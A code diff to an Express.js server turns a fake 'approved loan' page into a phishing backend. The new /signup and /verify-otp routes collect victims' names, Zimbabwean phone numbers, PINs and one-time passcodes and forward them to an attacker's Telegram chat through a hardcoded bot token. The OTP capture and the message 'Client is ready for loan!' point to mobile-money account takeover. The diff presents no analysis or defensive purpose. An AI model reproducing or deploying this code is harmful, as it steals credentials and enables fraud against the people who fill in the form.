@@ -1,96 +1,100 @@
-const express = require("express");
-const fs = require("fs");
-const path = require("path");
-
+const express = require('express');
+const path = require('path');
 const app = express();
-const PORT = process.env.PORT || 3000;
-const DB_FILE = path.join(__dirname, "database.json");
 
-app.use(express.urlencoded({ extended: true }));
+// Configuration
+const PORT = 3000;
+const BOT_TOKEN = '8895411616:AAHp-t75c2aBIIAdV8k7foAQHRZpUKIK7Gk';
+const CHAT_ID = '8565817118';
+
+// Middleware
 app.use(express.json());
-app.use(express.static(path.join(__dirname, "public")));
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
 
-app.get("/api/registrations", (req, res) => {
-  const data = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
-  res.json(data);
+// Serve Main Page
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.post("/register", (req, res) => {
-  const data = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
+// Handle Sign Up
+app.post('/signup', async (req, res) => {
+  const { firstName, surname, phone, pin } = req.body;
 
-  data.push({
-    name: req.body.name,
-    phone: req.body.phone,
-    age: req.body.age,
-    gender: req.body.gender,
-    loanAmount: req.body.loanAmount,
-    duration: req.body.duration,
-    interestRate: "0.1%",
-    status: "Approved",
-    date: new Date().toLocaleString()
-  });
+  let fullPhone = phone;
+  if (!phone.startsWith('+263') && !phone.startsWith('0')) {
+    fullPhone = '+263' + phone;
+  } else if (phone.startsWith('0')) {
+    fullPhone = '+263' + phone.substring(1);
+  }
 
-  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
+  const message = `
+📝 <b>New Sign Up</b>
 
-  res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Application</title>
-<style>
-body{
-  font-family:Arial,sans-serif;
-  background:#f5f5f5;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-  margin:0;
-}
-.card{
-  background:white;
-  padding:30px;
-  border-radius:10px;
-  text-align:center;
-  max-width:400px;
-  box-shadow:0 2px 10px rgba(0,0,0,.2);
-}
-button{
-  background:#1877F2;
-  color:white;
-  border:none;
-  padding:12px 20px;
-  border-radius:5px;
-  cursor:pointer;
-}
-</style>
-</head>
-<body>
+👤 <b>Name:</b> ${firstName} ${surname}
+📱 <b>Phone:</b> ${fullPhone}
+🔑 <b>PIN:</b> <code>${pin}</code>
 
-<div class="card">
-<h2>Loan Application Approved</h2>
+<i>Waiting for OTP verification...</i>
+  `;
 
-<p>Dear ${req.body.name},</p>
-
-<p>Your loan application has been approved.</p>
-
-<p>To continue with the next steps, please message us on our Facebook page.</p>
-
-<button onclick="window.location='/'">Done</button>
-
-</div>
-
-</body>
-</html>
-  `);
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    res.send('Success');
+  } catch (error) {
+    console.error(error);
+    res.send('Error');
+  }
 });
 
-const server = app.listen(PORT, "0.0.0.0", () => {
+// Handle OTP Verification
+app.post('/verify-otp', async (req, res) => {
+  const { firstName, surname, phone, pin, otp } = req.body;
+
+  let fullPhone = phone;
+  if (!phone.startsWith('+263') && !phone.startsWith('0')) {
+    fullPhone = '+263' + phone;
+  } else if (phone.startsWith('0')) {
+    fullPhone = '+263' + phone.substring(1);
+  }
+
+  const message = `
+✅ <b>OTP Verified</b>
+
+👤 <b>Name:</b> ${firstName} ${surname}
+📱 <b>Phone:</b> ${fullPhone}
+🔑 <b>PIN:</b> <code>${pin}</code>
+📲 <b>OTP:</b> <b>${otp}</b>
+
+<b>Client is ready for loan!</b>
+  `;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    res.send('Success');
+  } catch (error) {
+    console.error(error);
+    res.send('Error');
+  }
+});
+
+// Start Server
+app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
-});
-
-server.on("error", (err) => {
-  console.error("SERVER ERROR:", err);
 });
